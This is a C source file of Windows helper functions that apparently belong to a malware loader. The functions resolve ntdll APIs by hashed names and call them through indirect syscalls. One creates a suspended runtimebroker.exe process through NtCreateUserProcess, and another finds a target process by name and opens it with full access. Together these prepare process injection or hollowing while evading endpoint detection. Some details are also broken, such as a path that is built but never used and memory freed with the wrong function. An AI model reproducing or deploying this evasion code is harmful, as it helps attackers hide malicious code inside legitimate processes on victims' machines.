#include "syscall_functions.h"

#define PROCESS_CREATE_FLAGS_SUSPENDED 0x00000200
#define THREAD_CREATE_FLAGS_CREATE_SUSPENDED 0x00000001
#define RTL_USER_PROCESS_PARAMETERS_NORMALIZED 0x01

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

#define NtCurrentPeb()          (NtCurrentTeb()->ProcessEnvironmentBlock)
#define RtlProcessHeap()        (NtCurrentPeb()->ProcessHeap)

typedef NTSTATUS(NTAPI* tRtlInitUnicodeString)(PUNICODE_STRING, PCWSTR);
typedef NTSTATUS(NTAPI* tRtlDestroyProcessParameters)(PRTL_USER_PROCESS_PARAMETERS);
typedef NTSTATUS(NTAPI* tRtlCreateProcessParametersEx)(
    PRTL_USER_PROCESS_PARAMETERS*,
    PUNICODE_STRING,
    PUNICODE_STRING,
    PUNICODE_STRING,
    PUNICODE_STRING,
    PVOID,
    PUNICODE_STRING,
    PUNICODE_STRING,
    PUNICODE_STRING,
    PUNICODE_STRING,
    ULONG);
typedef NTSTATUS(NTAPI* tRtlAllocateHeap)(
    _In_ PVOID HeapHandle,
    _In_opt_ ULONG Flags,
    _In_ SIZE_T Size);


typedef enum _THREADINFOCLASS {
    ThreadBasicInformation = 0,
    ThreadTimes = 1,
    ThreadPriority = 2,
    ThreadBasePriority = 3,
    ThreadAffinityMask = 4,
    ThreadImpersonationToken = 5,
    ThreadDescriptor = 6,
    ThreadSuspendCount = 7, // The value you need
    ThreadResumed = 8,      // Other useful values you may need
    ThreadControlFlow = 10
} THREADINFOCLASS;


BOOL CreateSuspendedProcessSyscall(IN PWSTR pwProcessName, OUT PROCESS_INFORMATION* pPi, HANDLE hStdOutput, HANDLE hStdError) {
    HMODULE hNtdll = (HMODULE)GetModuleHandle("ntdll.dll");
    if (!hNtdll) {
        DebugPrint("[!] Failed to load ntdll.dll.\n");
        return 1;
    }

    NtCreateUserProcess_t NtCreateUserProcess = (NtCreateUserProcess_t)PrepareSyscall((char *)("NtCreateUserProcess"));
    tRtlAllocateHeap RtlAllocateHeap = (tRtlAllocateHeap)GetProcAddressH(hNtdll, RtlAllocateHeap_JOAA);
    tRtlDestroyProcessParameters RtlDestroyProcessParameters = (tRtlDestroyProcessParameters)GetProcAddressH(hNtdll, RtlDestroyProcessParameters_JOAA);
    tRtlCreateProcessParametersEx RtlCreateProcessParametersEx = (tRtlCreateProcessParametersEx)GetProcAddressH(hNtdll, RtlCreateProcessParametersEx_JOAA);

    const wchar_t* basePath = L"C:\\Windows\\System32\\";
    size_t totalLength = _wcslen(basePath) + _wcslen(pwProcessName) + 1;

    // Allocate memory for the combined string
    PWSTR pwProcessPath = (PWSTR)malloc(totalLength * sizeof(wchar_t));
    if (!pwProcessPath) {
        WDebugPrint(L"Memory allocation failed.\n");
        return 1;
    }

    // Combine the strings
    _wcscpy(pwProcessPath, L"\\??\\C:\\Windows\\System32\\");
    _wcscat(pwProcessPath, pwProcessName);


    UNICODE_STRING NtImagePath;
    _RtlInitUnicodeString(&NtImagePath, (PWSTR)L"\\??\\C:\\Windows\\System32\\runtimebroker.exe");

    // Create the process parameters
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
    RtlCreateProcessParametersEx(&ProcessParameters, &NtImagePath, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROCESS_PARAMETERS_NORMALIZED);

    // Set the standard handles
    ProcessParameters->StandardOutput = hStdOutput;
    ProcessParameters->StandardError = hStdError;

    // Initialize the PS_CREATE_INFO structure
    PS_CREATE_INFO CreateInfo = { 0 };
    CreateInfo.Size = sizeof(CreateInfo);
    CreateInfo.State = PsCreateInitialState;

    // Initialize the PS_ATTRIBUTE_LIST structure
    PPS_ATTRIBUTE_LIST pAttributeList = (PPS_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
    if (!pAttributeList)
        return FALSE;

    pAttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST) - sizeof(PS_ATTRIBUTE);
    pAttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
    pAttributeList->Attributes[0].Size = NtImagePath.Length;
    pAttributeList->Attributes[0].Value = (ULONG_PTR)NtImagePath.Buffer;

    // Create the process
    HANDLE hProcess = NULL, hThread = NULL;
    NTSTATUS status = NtCreateUserProcess(
        &hProcess,
        &hThread,
        PROCESS_ALL_ACCESS,
        THREAD_ALL_ACCESS,
        NULL,
        NULL,
        PROCESS_CREATE_FLAGS_INHERIT_HANDLES | PROCESS_CREATE_FLAGS_SUSPENDED,
        THREAD_CREATE_FLAGS_CREATE_SUSPENDED,
        ProcessParameters,
        &CreateInfo,
        pAttributeList
    );

    if (!NT_SUCCESS(status)) {
        DebugPrint("[!] Process creation failed with status: 0x%X\n", status);
        RtlDestroyProcessParameters(ProcessParameters);
        return FALSE;
    }

    pPi->hProcess = hProcess;
    pPi->hThread = hThread;
    pPi->dwProcessId = GetProcessId(hProcess);
    pPi->dwThreadId = GetThreadId(hThread);

    DebugPrint("[+] Process created successfully in a suspended state.\n");
    RtlDestroyProcessParameters(ProcessParameters);

    return TRUE;
}

BOOL GetRemoteProcessHandleSyscall(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {
	DebugPrint("[i] Using indirect syscall version of GetRemoteProcessHandle.\n");
    HANDLE hSnapShot = NULL;
    PROCESSENTRY32W	Proc = { .dwSize = sizeof(PROCESSENTRY32W) };

    NtQuerySystemInformation_t pNtQuerySystemInformation = (NtQuerySystemInformation_t)PrepareSyscallHash(NtQuerySystemInformation_JOAA);

    if (!pNtQuerySystemInformation) {
        DebugPrint("[-] Failed to prepare syscall for NtQuerySystemInformation.\n");
        return FALSE;
    }

    ULONG bufferSize = 0;
    PVOID pProcessInfo = NULL;
    NTSTATUS status = pNtQuerySystemInformation(SystemProcessInformation, pProcessInfo, 0, &bufferSize);

    if (status != STATUS_INFO_LENGTH_MISMATCH) {
        DebugPrint("[-] NtQuerySystemInformation failed: 0x%X\n", status);
        return FALSE;
    }

	NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)PrepareSyscallHash(NtAllocateVirtualMemory_JOAA);
    
    if (!pNtAllocateVirtualMemory) {
        DebugPrint("[-] Failed to prepare syscall for NtAllocateVirtualMemory.\n");
        return FALSE;
    }

    SIZE_T regionSize = bufferSize;
    status = pNtAllocateVirtualMemory(
        GetCurrentProcess(),
        &pProcessInfo,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
	if (!NT_SUCCESS(status)) {
        DebugPrint("[-] NtAllocateVirtualMemory failed: 0x%X\n", status);
        return FALSE;
    }

    status = pNtQuerySystemInformation(SystemProcessInformation, pProcessInfo, bufferSize, &bufferSize);
    if (!NT_SUCCESS(status)) {
        DebugPrint("[-] NtQuerySystemInformation failed: 0x%X\n", status);
        HeapFree(GetProcessHeap(), 0, pProcessInfo);
        return FALSE;
    }

    PSYSTEM_PROCESS_INFORMATION pCurrent = (PSYSTEM_PROCESS_INFORMATION)pProcessInfo;
    while (pCurrent) {
        if (pCurrent->ImageName.Buffer && _wcsicmp(pCurrent->ImageName.Buffer, szProcessName) == 0) {
            *dwProcessId = (DWORD)(ULONG_PTR)pCurrent->UniqueProcessId;
            break;
        }
        pCurrent = (pCurrent->NextEntryOffset) ? (PSYSTEM_PROCESS_INFORMATION)((LPBYTE)pCurrent + pCurrent->NextEntryOffset) : NULL;
    }

    if (dwProcessId == NULL || *dwProcessId == 0) {
        DebugPrint("[-] Process not found.\n");
        goto _EndOfFunction;
    }

    NtOpenProcess_t pNtOpenProcess = (NtOpenProcess_t)PrepareSyscallHash(NtOpenProcess_JOAA);

    if (!pNtOpenProcess) {
        DebugPrint("[-] Failed to prepare syscall for NtOpenProcess.\n");
        return FALSE;
    }

    OBJECT_ATTRIBUTES ObjectAttributes;
    CLIENT_ID ClientId;
    InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
    ClientId.UniqueProcessId = (HANDLE)(ULONG_PTR)*dwProcessId;
    ClientId.UniqueThreadId = NULL;

    status = pNtOpenProcess(hProcess, PROCESS_ALL_ACCESS, &ObjectAttributes, &ClientId);

    if (!NT_SUCCESS(status)) {
        DebugPrint("[!] NtOpenProcess Failed With Error: 0x%X \n", status);
        return FALSE;
    }

_EndOfFunction:
    if (pProcessInfo) {
        NtFreeVirtualMemory_t pNtFreeVirtualMemory = (NtFreeVirtualMemory_t)PrepareSyscallHash(NtFreeVirtualMemory_JOAA);
        if (!pNtFreeVirtualMemory) {
            DebugPrint("[-] Failed to prepare syscall for NtFreeVirtualMemory.\n");
            return FALSE;
        }

        NTSTATUS status = pNtFreeVirtualMemory(
            GetCurrentProcess(),  // Using the current process handle
            &pProcessInfo,        // Pointer to the base address of the allocated memory
            &regionSize,          // Size of the allocated memory
            MEM_RELEASE           // Indicate we want to fully release the memory
        );
        if (!NT_SUCCESS(status)) {
            DebugPrint("[-] NtFreeVirtualMemory failed: 0x%X\n", status);
            return FALSE;
        }

	}
    
    return (*dwProcessId != NULL && *hProcess != NULL);
}